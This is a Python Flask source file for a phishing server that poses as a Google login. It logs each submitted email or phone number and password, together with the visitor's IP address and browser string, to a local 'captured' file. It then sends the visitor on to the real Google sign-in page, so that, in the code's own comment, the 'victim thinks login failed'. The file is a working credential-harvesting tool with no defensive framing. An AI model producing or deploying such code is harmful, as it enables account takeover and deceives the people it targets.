from flask import Flask, request, render_template, redirect
import datetime
import os

app = Flask(__name__)

# Create captured folder
if not os.path.exists('captured'):
    os.makedirs('captured')

def save_credentials(ip, user_agent, username, password):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[+] {timestamp}\n"
    log_entry += f"IP: {ip}\n"
    log_entry += f"User-Agent: {user_agent}\n"
    log_entry += f"Email/Phone: {username}\n"
    log_entry += f"Password: {password}\n"
    log_entry += "-" * 60 + "\n\n"

    with open("captured/credentials.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    save_credentials(ip, user_agent, username, password)

    # Redirect to real Google (victim thinks login failed or session expired)
    return redirect("https://accounts.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # Change debug=False in real use